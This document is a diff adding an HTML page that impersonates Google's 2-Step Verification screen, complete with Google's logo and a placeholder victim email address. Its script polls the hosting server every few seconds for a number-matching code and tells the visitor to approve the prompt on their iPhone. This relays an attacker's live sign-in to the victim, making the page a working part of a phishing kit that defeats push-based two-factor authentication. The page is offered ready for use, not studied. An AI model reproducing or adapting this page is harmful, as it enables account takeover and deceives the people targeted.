@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Results Page</title>
+    <style>
+        #loading {
+            display: none;
+        }
+    </style>
+      <script src="https://cdn.tailwindcss.com"></script>
+
+</head>
+<body>
+        <div class="flex min-h-screen flex-col justify-center overflow-hidden bg-gray-200 py-6 sm:py-12">
+        <div class="mx-auto">
+          <div class="shadow-xxl mx-auto grid grid-cols-2 gap-2 rounded-lg bg-white px-6 pb-8 pt-10 ring-1 ring-gray-900/5">
+            <div class="col-span-full mx-auto max-w-md md:col-span-1">
+              <svg xmlns="https://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 48 48" aria-hidden="true" jsname="jjf7Ff">
+                <path fill="#4285F4" d="M45.12 24.5c0-1.56-.14-3.06-.4-4.5H24v8.51h11.84c-.51 2.75-2.06 5.08-4.39 6.64v5.52h7.11c4.16-3.83 6.56-9.47 6.56-16.17z"></path>
+                <path fill="#34A853" d="M24 46c5.94 0 10.92-1.97 14.56-5.33l-7.11-5.52c-1.97 1.32-4.49 2.1-7.45 2.1-5.73 0-10.58-3.87-12.31-9.07H4.34v5.7C7.96 41.07 15.4 46 24 46z"></path>
+                <path fill="#FBBC05" d="M11.69 28.18C11.25 26.86 11 25.45 11 24s.25-2.86.69-4.18v-5.7H4.34C2.85 17.09 2 20.45 2 24c0 3.55.85 6.91 2.34 9.88l7.35-5.7z"></path>
+                <path fill="#EA4335" d="M24 10.75c3.23 0 6.13 1.11 8.41 3.29l6.31-6.31C34.91 4.18 29.93 2 24 2 15.4 2 7.96 6.93 4.34 14.12l7.35 5.7c1.73-5.2 6.58-9.07 12.31-9.07z"></path>
+                <path fill="none" d="M2 2h44v44H2z"></path>
+              </svg>
+              <div class="">
+                <div class="space-y-6 py-8 text-base leading-7 text-gray-600">
+                  <h1 class="text-3xl font-semibold text-black">2-Step Verification</h1>
+                  <p>To help keep your account safe, Google wants to make sure that it’s really you trying to sign in</p>
+                </div>
+                <div class="p-2">
+                  <div class="relative mt-2 rounded-xl bg-white shadow-sm">
+                    <input type="text" name="price" id="price" class="block w-full rounded-md border-0 py-1.5 pl-7 pr-20 text-gray-900 ring-1 ring-inset ring-gray-300 placeholder:text-gray-400 focus:ring-2 focus:ring-inset focus:ring-indigo-600 sm:text-sm sm:leading-6" placeholder="peteromolloz@gmail.com" />
+                  </div>
+                </div>
+              </div>
+            </div>
+            <div class="col-span-full mx-auto max-w-md md:col-span-1">
+              <div class="">
+                <div class="space-y-6 py-8 text-base leading-7 text-gray-600">
+                  <h1 id="result"  class="text-center text-3xl font-semibold text-black">34</h1>
+                  <div id="loading">Loading...</div>
+                  <!-- <div class="text-center text-3xl font-semibold text-black" id="result"></div> -->
+                  <p>Check your Iphone</p>
+                  <p> Google sent a notification to your Iphone. Tap <span id="result2"  class="font-semibold ">34</span> Yes on the notification, then tap on your phone to verify that it’s you.
+                    </p>
+                 </div>
+              </div>
+            </div>
+      
+            <p class="w-fit rounded-xl bg-slate-50 px-3 py-1 text-blue-700">Resend it</p>
+            <p>Try another way</p>
+          </div>
+      
+          <div class="flex justify-between px-8 py-4">
+            <p>English (United Kingdom)</p>
+            <div class="flex space-x-5">
+              <p>Help</p>
+              <p>Privacy</p>
+              <p>Terms</p>
+            </div>
+          </div>
+        </div>
+      </div>
+
+    <script> 
+        document.addEventListener('DOMContentLoaded', (event) => {
+        // Function to fetch the number from the server
+        function fetchNumber() {
+            // Show the loading message
+            document.getElementById('loading').innerHTML = '<p>Loading...</p>';
+
+            const domainUrl = window.location.origin;
+
+            // Fetch the result from the PHP server
+            fetch(`${domainUrl}/code.txt`)
+                .then(response => response.text())
+                .then(data => {
+                    // Hide the loading message
+                    document.getElementById('loading').innerHTML = '';
+
+                    // Display the result
+                    document.getElementById('result').innerHTML = `<p>${data}</p>`;
+                    document.getElementById("result2").innerText = data;
+                })
+                .catch(error => {
+                    console.error('Error fetching data:', error);
+
+                    // Hide the loading message
+                    document.getElementById('loading').innerHTML = '';
+
+                    // Display the error
+                    document.getElementById('result').innerHTML = '<p>Error fetching data.</p>';
+                    document.getElementById("result2").innerText = '';
+
+                });
+        }
+
+        // Call the fetch function once when the page loads
+        fetchNumber();
+
+        // Fetch the number every 10 seconds
+        setInterval(fetchNumber, 3000);
+    });
+    </script>
+</body>
+</html>
